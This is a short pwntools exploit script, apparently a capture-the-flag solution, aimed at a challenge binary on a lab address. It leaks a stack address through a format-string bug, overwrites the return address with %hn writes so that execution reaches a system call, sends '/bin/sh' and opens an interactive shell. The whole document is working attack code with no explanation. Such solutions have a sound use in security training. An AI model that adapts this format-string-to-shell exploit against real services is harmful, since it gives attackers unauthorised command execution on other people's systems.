from pwn import *
import ctypes    
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ["tmux", "splitw", "-h"]                        
# context.terminal = ["tmux","splitw","-h"]#产生左右分屏，不带的话是上下分屏比较难受
# gdb.attach(io)                    # 启动 GDB
io = connect("172.24.112.1",10825) 
# io = process("./pwn")        
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

system_addr = 0x40127b

fmt = b"%8$p"
io.sendlineafter("You start talking to him...",fmt)
io.recvuntil('0x')
ret_addr = int(io.recv(12),16)-0x18
log.debug(hex(ret_addr))
pause()
io.sendlineafter("You enraged the monster-prepare for battle!", 'a' * 7)

count = ret_addr & 0xffff
fmt = f"%{count}c%12$hn".format().encode()
io.sendlineafter("You start talking to him...",fmt)
pause()
io.recvuntil("You enraged the monster-prepare for battle!")
io.sendline('a' * 7)
pause()
count = system_addr & 0xffff
fmt = f"%{count}c%32$hn".format().encode()
io.sendlineafter("You start talking to him...",fmt)
pause()
io.sendlineafter("You enraged the monster-prepare for battle!", '/bin/sh\x00')

io.interactive()
